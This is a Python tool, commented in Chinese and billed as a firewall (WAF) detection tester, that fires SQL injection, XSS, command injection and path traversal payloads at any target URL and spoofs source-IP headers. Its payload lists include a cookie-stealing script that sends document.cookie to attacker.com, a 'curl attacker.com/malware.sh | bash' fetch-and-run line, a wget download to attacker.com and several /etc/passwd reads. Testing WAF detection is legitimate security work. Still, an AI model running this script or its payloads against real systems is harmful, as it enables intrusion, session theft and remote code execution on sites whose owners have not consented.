#!/usr/bin/env python
# coding: utf-8
import requests
import argparse
import time
import random
import json
import urllib.parse
from colorama import init, Fore, Style

# 初始化colorama
init()

def print_banner():
    banner = """
    ╔═══════════════════════════════════════════════╗
    ║                                               ║
    ║   HTTP 攻击测试工具 - 防火墙检测测试专用      ║
    ║                                               ║
    ╚═══════════════════════════════════════════════╝
    """
    print(Fore.CYAN + banner + Style.RESET_ALL)

def print_success(message):
    print(Fore.GREEN + f"[+] {message}" + Style.RESET_ALL)

def print_error(message):
    print(Fore.RED + f"[-] {message}" + Style.RESET_ALL)

def print_info(message):
    print(Fore.BLUE + f"[*] {message}" + Style.RESET_ALL)

def print_warning(message):
    print(Fore.YELLOW + f"[!] {message}" + Style.RESET_ALL)

def send_sql_injection_attacks(target_url, headers, verbose=False):
    """发送SQL注入攻击"""
    print_info("开始SQL注入攻击测试...")
    
    sql_injection_payloads = [
        "' OR '1'='1", 
        "' OR '1'='1' --", 
        "' OR '1'='1' #", 
        "' OR '1'='1'/*", 
        "' UNION SELECT username, password FROM users --",
        "admin' --", 
        "admin' #",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "') OR ('1'='1",
        "1' ORDER BY 10 --",
        "1' UNION SELECT null, version() --"
    ]
    
    # 构建测试端点
    endpoints = [
        "/accounts/login/",
        "/dashboard/",
        "/search",
        "/user/profile"
    ]
    
    responses = []
    
    for endpoint in endpoints:
        full_url = target_url.rstrip('/') + endpoint
        print_info(f"测试端点: {full_url}")
        
        for payload in sql_injection_payloads:
            # 创建带攻击标记的请求头
            attack_headers = headers.copy()
            attack_headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "X-SQL-Injection-Test": "true",  # 明确标记这是SQL注入测试
                "X-Attack-Type": "sql_injection"
            })
            
            # GET 请求测试 - 使用明确的URL查询参数结构
            params = {
                "id": payload,
                "username": f"admin{payload}",
                "password": f"test{payload}",
                "query": f"SELECT * FROM users WHERE username='{payload}'"
            }
            
            # 明确显示完整的GET URL（包含查询参数）以便在日志中清晰显示
            query_string = "&".join([f"{k}={urllib.parse.quote_plus(v)}" for k, v in params.items()])
            full_request_url = f"{full_url}?{query_string}"
            
            if verbose:
                print(f"  SQL注入 (GET) - {full_request_url}")
            
            try:
                response = requests.get(full_url, params=params, timeout=5, headers=attack_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  状态码: {status}")
                
                responses.append({
                    "url": full_url,
                    "method": "GET",
                    "payload": payload, 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
            
            # POST 请求测试 - 使用标准的application/x-www-form-urlencoded格式
            data = {
                "id": payload,
                "username": f"admin{payload}",
                "password": f"test{payload}",
                "search": f"test' UNION SELECT username,password FROM users WHERE '1'='1"
            }
            
            try:
                response = requests.post(full_url, data=data, timeout=5, headers=attack_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  SQL注入 (POST) - {payload} - 状态码: {status}")
                    
                    # 显示POST请求的详细信息
                    print(f"  POST数据: {data}")
                
                responses.append({
                    "url": full_url,
                    "method": "POST",
                    "payload": payload, 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
            
            # 发送一个JSON格式的SQL注入攻击
            json_headers = attack_headers.copy()
            json_headers["Content-Type"] = "application/json"
            
            json_data = {
                "username": f"admin{payload}",
                "password": f"test{payload}",
                "query": f"SELECT * FROM users WHERE username='{payload}'",
                "filter": f"user_id > 0 OR 1=1"
            }
            
            try:
                response = requests.post(full_url, json=json_data, timeout=5, headers=json_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  SQL注入 (JSON) - {payload} - 状态码: {status}")
                    print(f"  JSON数据: {json.dumps(json_data)}")
                
                responses.append({
                    "url": full_url,
                    "method": "POST (JSON)",
                    "payload": json.dumps(json_data), 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
    
    print_success(f"SQL注入测试完成: 发送了 {len(responses)} 个请求")
    return responses

def send_xss_attacks(target_url, headers, verbose=False):
    """发送XSS攻击"""
    print_info("开始XSS攻击测试...")
    
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "\"><script>alert(1)</script>",
        "' onmouseover='alert(1)'",
        "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
        "<body onload=alert(1)>",
        "<img src=\"x\" onload=\"alert(1)\" />",
        "<div style=\"width:expression(alert(1))\">",
        "<a href=\"javascript:alert(1)\">点我</a>"
    ]
    
    # 构建测试端点
    endpoints = [
        "/search",
        "/dashboard/",
        "/user/profile",
        "/comments"
    ]
    
    responses = []
    
    for endpoint in endpoints:
        full_url = target_url.rstrip('/') + endpoint
        print_info(f"测试端点: {full_url}")
        
        for payload in xss_payloads:
            # 创建带攻击标记的请求头
            attack_headers = headers.copy()
            attack_headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "X-XSS-Test": "true",  # 明确标记这是XSS测试
                "X-Attack-Type": "xss"
            })
            
            # GET 请求测试
            params = {
                "q": payload,
                "search": payload,
                "comment": payload,
                "name": payload
            }
            
            # 构建完整URL以便在日志中清晰显示
            query_string = "&".join([f"{k}={urllib.parse.quote_plus(v)}" for k, v in params.items()])
            full_request_url = f"{full_url}?{query_string}"
            
            if verbose:
                print(f"  XSS (GET) - {full_request_url}")
            
            try:
                response = requests.get(full_url, params=params, timeout=5, headers=attack_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  状态码: {status}")
                
                responses.append({
                    "url": full_url,
                    "method": "GET",
                    "payload": payload, 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
            
            # 标准POST表单请求
            data = {
                "q": payload,
                "search": payload,
                "comment": payload,
                "name": payload,
                "message": f"This is a test with {payload}"
            }
            
            try:
                response = requests.post(full_url, data=data, timeout=5, headers=attack_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  XSS (POST表单) - {payload[:30]}... - 状态码: {status}")
                    print(f"  POST数据: {data}")
                
                responses.append({
                    "url": full_url,
                    "method": "POST",
                    "payload": payload, 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
                
            # JSON POST请求
            json_headers = attack_headers.copy()
            json_headers["Content-Type"] = "application/json"
            
            json_data = {
                "search": payload,
                "username": f"user_{payload}",
                "comment": f"Test comment with {payload}",
                "html_content": f"<div>{payload}</div>"
            }
            
            try:
                response = requests.post(full_url, json=json_data, timeout=5, headers=json_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  XSS (JSON) - {payload[:30]}... - 状态码: {status}")
                    print(f"  JSON数据: {json.dumps(json_data)}")
                
                responses.append({
                    "url": full_url,
                    "method": "POST (JSON)",
                    "payload": json.dumps(json_data), 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
    
    print_success(f"XSS测试完成: 发送了 {len(responses)} 个请求")
    return responses

def send_command_injection_attacks(target_url, headers, verbose=False):
    """发送命令注入攻击"""
    print_info("开始命令注入攻击测试...")
    
    cmd_injection_payloads = [
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "& cat /etc/passwd",
        "; ls -la",
        "| ls -la",
        "& ls -la",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        "|| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; ping -c 4 8.8.8.8",
        "| ping -c 4 8.8.8.8",
        "; curl http://attacker.com/malware.sh | bash",
        "| wget http://attacker.com -O /tmp/malware"
    ]
    
    # 构建测试端点
    endpoints = [
        "/api/system",
        "/tools/ping",
        "/admin/system",
        "/utils/network"
    ]
    
    responses = []
    
    for endpoint in endpoints:
        full_url = target_url.rstrip('/') + endpoint
        print_info(f"测试端点: {full_url}")
        
        for payload in cmd_injection_payloads:
            # 创建带攻击标记的请求头
            attack_headers = headers.copy()
            attack_headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "X-Command-Injection-Test": "true",  # 明确标记这是命令注入测试
                "X-Attack-Type": "command_injection"
            })
            
            # GET 请求测试
            params = {
                "cmd": payload,
                "host": f"localhost{payload}",
                "ip": f"8.8.8.8{payload}",
                "domain": f"example.com{payload}"
            }
            
            # 构建完整URL以便在日志中清晰显示
            query_string = "&".join([f"{k}={urllib.parse.quote_plus(v)}" for k, v in params.items()])
            full_request_url = f"{full_url}?{query_string}"
            
            if verbose:
                print(f"  命令注入 (GET) - {full_request_url}")
            
            try:
                response = requests.get(full_url, params=params, timeout=5, headers=attack_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  状态码: {status}")
                
                responses.append({
                    "url": full_url,
                    "method": "GET",
                    "payload": payload, 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
            
            # POST 请求测试
            data = {
                "cmd": payload,
                "host": f"localhost{payload}",
                "ip": f"8.8.8.8{payload}",
                "domain": f"example.com{payload}",
                "ping_target": f"8.8.8.8{payload}"
            }
            
            try:
                response = requests.post(full_url, data=data, timeout=5, headers=attack_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  命令注入 (POST) - {payload} - 状态码: {status}")
                    print(f"  POST数据: {data}")
                
                responses.append({
                    "url": full_url,
                    "method": "POST",
                    "payload": payload, 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
            
            # JSON POST请求
            json_headers = attack_headers.copy()
            json_headers["Content-Type"] = "application/json"
            
            json_data = {
                "command": f"ping {payload}",
                "exec": f"system_command{payload}",
                "params": {
                    "host": f"localhost{payload}",
                    "options": f"-c 4 {payload}"
                }
            }
            
            try:
                response = requests.post(full_url, json=json_data, timeout=5, headers=json_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  命令注入 (JSON) - {payload} - 状态码: {status}")
                    print(f"  JSON数据: {json.dumps(json_data)}")
                
                responses.append({
                    "url": full_url,
                    "method": "POST (JSON)",
                    "payload": json.dumps(json_data), 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
    
    print_success(f"命令注入测试完成: 发送了 {len(responses)} 个请求")
    return responses

def send_path_traversal_attacks(target_url, headers, verbose=False):
    """发送路径遍历攻击"""
    print_info("开始路径遍历攻击测试...")
    
    path_traversal_payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "..\\..\\..\\Windows\\system.ini",
        "..\\..\\..\\..\\Windows\\system.ini",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "....//....//....//etc/passwd",
        "....//../....//../....//../etc/passwd",
        "/etc/passwd",
        "C:\\Windows\\system.ini"
    ]
    
    # 构建测试端点
    endpoints = [
        "/file",
        "/download",
        "/view",
        "/resource",
        "/static"
    ]
    
    responses = []
    
    for endpoint in endpoints:
        full_url = target_url.rstrip('/') + endpoint
        print_info(f"测试端点: {full_url}")
        
        for payload in path_traversal_payloads:
            # 创建带攻击标记的请求头
            attack_headers = headers.copy()
            attack_headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "X-Path-Traversal-Test": "true",  # 明确标记这是路径遍历测试
                "X-Attack-Type": "path_traversal"
            })
            
            # GET 请求测试
            params = {
                "file": payload,
                "path": payload,
                "doc": payload,
                "img": payload,
                "download": payload
            }
            
            # 构建完整URL以便在日志中清晰显示
            query_string = "&".join([f"{k}={urllib.parse.quote_plus(v)}" for k, v in params.items()])
            full_request_url = f"{full_url}?{query_string}"
            
            if verbose:
                print(f"  路径遍历 (GET) - {full_request_url}")
            
            try:
                response = requests.get(full_url, params=params, timeout=5, headers=attack_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  状态码: {status}")
                
                responses.append({
                    "url": full_url,
                    "method": "GET",
                    "payload": payload, 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
            
            # POST 请求测试
            data = {
                "file": payload,
                "path": payload,
                "doc": payload,
                "img": payload,
                "download": payload
            }
            
            try:
                response = requests.post(full_url, data=data, timeout=5, headers=attack_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  路径遍历 (POST) - {payload} - 状态码: {status}")
                    print(f"  POST数据: {data}")
                
                responses.append({
                    "url": full_url,
                    "method": "POST",
                    "payload": payload, 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
                
            # JSON POST请求
            json_headers = attack_headers.copy()
            json_headers["Content-Type"] = "application/json"
            
            json_data = {
                "fileName": payload,
                "path": f"/var/www/{payload}",
                "relativePath": f"../../../{payload}",
                "resource": {
                    "location": payload,
                    "type": "file"
                }
            }
            
            try:
                response = requests.post(full_url, json=json_data, timeout=5, headers=json_headers)
                status = response.status_code
                
                if verbose:
                    print(f"  路径遍历 (JSON) - {payload} - 状态码: {status}")
                    print(f"  JSON数据: {json.dumps(json_data)}")
                
                responses.append({
                    "url": full_url,
                    "method": "POST (JSON)",
                    "payload": json.dumps(json_data), 
                    "status": status
                })
                
                # 增加随机延迟，避免触发速率限制
                time.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                print_error(f"请求失败: {str(e)}")
    
    print_success(f"路径遍历测试完成: 发送了 {len(responses)} 个请求")
    return responses

def send_pure_http_attack(target_url, headers, attack_type, payload, verbose=False):
    """发送纯HTTP格式的攻击，包含完整HTTP请求内容，确保防火墙能完整捕获"""
    print_info(f"发送纯HTTP {attack_type} 攻击...")
    
    attack_headers = headers.copy()
    attack_headers.update({
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "X-Attack-Type": attack_type,
        "X-Pure-HTTP-Attack": "true"
    })
    
    # 确保URL有一个可以接受请求的端点
    if attack_type == "sql_injection":
        endpoint = "/accounts/login/"
    elif attack_type == "xss":
        endpoint = "/search"
    elif attack_type == "command_injection":
        endpoint = "/api/system"
    elif attack_type == "path_traversal":
        endpoint = "/file"
    else:
        endpoint = "/dashboard/"
    
    full_url = target_url.rstrip('/') + endpoint
    
    # 构建直接的URL查询字符串，确保payload被完整保留
    if attack_type == "sql_injection":
        query_string = f"username=admin' OR '1'='1&password={payload}&remember=1"
    elif attack_type == "xss":
        query_string = f"q={urllib.parse.quote_plus(payload)}&search={urllib.parse.quote_plus(payload)}"
    elif attack_type == "command_injection":
        query_string = f"cmd=ping {urllib.parse.quote_plus(payload)}&host=localhost"
    elif attack_type == "path_traversal":
        query_string = f"file={urllib.parse.quote_plus(payload)}&path={urllib.parse.quote_plus(payload)}"
    else:
        query_string = f"payload={urllib.parse.quote_plus(payload)}"
    
    # GET请求
    get_url = f"{full_url}?{query_string}"
    if verbose:
        print(f"  纯HTTP攻击 (GET) - {get_url}")
    
    try:
        response = requests.get(get_url, headers=attack_headers, timeout=5)
        status = response.status_code
        
        if verbose:
            print(f"  状态码: {status}")
    except Exception as e:
        print_error(f"GET请求失败: {str(e)}")
    
    # POST请求 - 使用原始data字符串，确保payload完整保留在HTTP主体中
    try:
        # 构建完整的POST数据
        post_data = query_string
        
        # 更新Content-Length和其他必要的头部
        post_headers = attack_headers.copy()
        post_headers["Content-Length"] = str(len(post_data))
        
        response = requests.post(full_url, data=post_data, headers=post_headers, timeout=5)
        status = response.status_code
        
        if verbose:
            print(f"  纯HTTP攻击 (POST) - {attack_type} - 状态码: {status}")
            print(f"  POST数据: {post_data}")
    except Exception as e:
        print_error(f"POST请求失败: {str(e)}")
    
    # 原始JSON也发送一份
    try:
        json_data = {
            "attack_type": attack_type,
            "payload": payload,
            "test": "Raw attack payload in JSON format"
        }
        
        json_headers = attack_headers.copy()
        json_headers["Content-Type"] = "application/json"
        
        response = requests.post(full_url, json=json_data, headers=json_headers, timeout=5)
        status = response.status_code
        
        if verbose:
            print(f"  纯HTTP攻击 (JSON) - {attack_type} - 状态码: {status}")
            print(f"  JSON数据: {json.dumps(json_data)}")
    except Exception as e:
        print_error(f"JSON请求失败: {str(e)}")
    
    print_success("纯HTTP攻击完成")

def get_random_ip():
    """生成随机IP地址"""
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def main():
    parser = argparse.ArgumentParser(description="HTTP 攻击测试工具 - 防火墙检测测试专用")
    parser.add_argument("--target", "-t", required=True, help="目标URL，例如 http://127.0.0.1:8000")
    parser.add_argument("--verbose", "-v", action="store_true", help="显示详细输出")
    parser.add_argument("--attack-type", "-a", choices=["all", "sql", "xss", "cmd", "path", "pure"], default="all", 
                        help="攻击类型: sql=SQL注入, xss=跨站脚本, cmd=命令注入, path=路径遍历, pure=纯HTTP攻击, all=所有攻击")
    parser.add_argument("--delay", "-d", type=float, default=1.0, 
                        help="攻击之间的延迟时间(秒)")
    parser.add_argument("--spoof-ip", "-s", help="伪造的来源IP地址，例如 8.8.8.8")
    parser.add_argument("--payload", "-p", help="自定义攻击负载，用于纯HTTP攻击模式")
    
    args = parser.parse_args()
    
    print_banner()
    print_info(f"目标: {args.target}")
    print_info(f"攻击类型: {args.attack_type}")
    print_info(f"详细模式: {'启用' if args.verbose else '禁用'}")
    
    # 设置伪造IP
    spoofed_ip = args.spoof_ip if args.spoof_ip else get_random_ip()
    print_info(f"伪造源IP: {spoofed_ip}")
    
    # 设置自定义HTTP头部，更容易被防火墙识别
    custom_headers = {
        "User-Agent": "WAFTest/1.0 (Penetration Testing Tool)",
        "X-Test": "WAF-Test",
        "Connection": "keep-alive",
        "X-Forwarded-For": spoofed_ip,
        "X-Real-IP": spoofed_ip,
        "X-Remote-Addr": spoofed_ip,
        "From": f"hacker@{spoofed_ip}",
        "Contact": f"hacker@{spoofed_ip}",
        "Client-IP": spoofed_ip,
        "Referer": f"http://{spoofed_ip}/attack_page.html"
    }
    
    all_responses = []
    
    try:
        # 纯HTTP攻击模式
        if args.attack_type in ["all", "pure"]:
            print_warning("发送纯HTTP格式的攻击请求...")
            
            # 如果指定了自定义负载，使用它，否则使用默认负载
            sql_payload = args.payload if args.payload else "' OR '1'='1' --"
            xss_payload = args.payload if args.payload else "<script>alert('XSS')</script>"
            cmd_payload = args.payload if args.payload else "; cat /etc/passwd"
            path_payload = args.payload if args.payload else "../../../etc/passwd"
            
            send_pure_http_attack(args.target, custom_headers, "sql_injection", sql_payload, args.verbose)
            time.sleep(args.delay)
            
            send_pure_http_attack(args.target, custom_headers, "xss", xss_payload, args.verbose)
            time.sleep(args.delay)
            
            send_pure_http_attack(args.target, custom_headers, "command_injection", cmd_payload, args.verbose)
            time.sleep(args.delay)
            
            send_pure_http_attack(args.target, custom_headers, "path_traversal", path_payload, args.verbose)
            time.sleep(args.delay)
        
        # 标准攻击模式
        if args.attack_type in ["all", "sql"]:
            print_warning(f"即将开始SQL注入测试，延迟 {args.delay} 秒...")
            time.sleep(args.delay)
            all_responses.extend(send_sql_injection_attacks(args.target, custom_headers, args.verbose))
        
        if args.attack_type in ["all", "xss"]:
            print_warning(f"即将开始XSS测试，延迟 {args.delay} 秒...")
            time.sleep(args.delay)
            all_responses.extend(send_xss_attacks(args.target, custom_headers, args.verbose))
        
        if args.attack_type in ["all", "cmd"]:
            print_warning(f"即将开始命令注入测试，延迟 {args.delay} 秒...")
            time.sleep(args.delay)
            all_responses.extend(send_command_injection_attacks(args.target, custom_headers, args.verbose))
        
        if args.attack_type in ["all", "path"]:
            print_warning(f"即将开始路径遍历测试，延迟 {args.delay} 秒...")
            time.sleep(args.delay)
            all_responses.extend(send_path_traversal_attacks(args.target, custom_headers, args.verbose))
        
        # 打印统计信息
        total_requests = len(all_responses)
        success_count = sum(1 for r in all_responses if 200 <= r["status"] < 300)
        client_error_count = sum(1 for r in all_responses if 400 <= r["status"] < 500)
        server_error_count = sum(1 for r in all_responses if 500 <= r["status"] < 600)
        
        print("\n" + "="*50)
        print_info("测试统计:")
        print(f"总请求数: {total_requests}")
        print(f"成功请求 (2xx): {success_count}")
        print(f"客户端错误 (4xx): {client_error_count}")
        print(f"服务器错误 (5xx): {server_error_count}")
        print("="*50)
        
        print_success("所有测试完成！请检查防火墙日志以验证攻击是否被检测。")
        print_info(f"在防火墙日志中查找来源IP为 {spoofed_ip} 的记录")
        print_info(f"查看方法: 访问 {args.target}/packets/ 并在源IP搜索框中输入 {spoofed_ip}")
        
    except KeyboardInterrupt:
        print_warning("\n测试被用户中断")
        print_info("已完成部分测试，请查看防火墙日志")

if __name__ == "__main__":
    main() 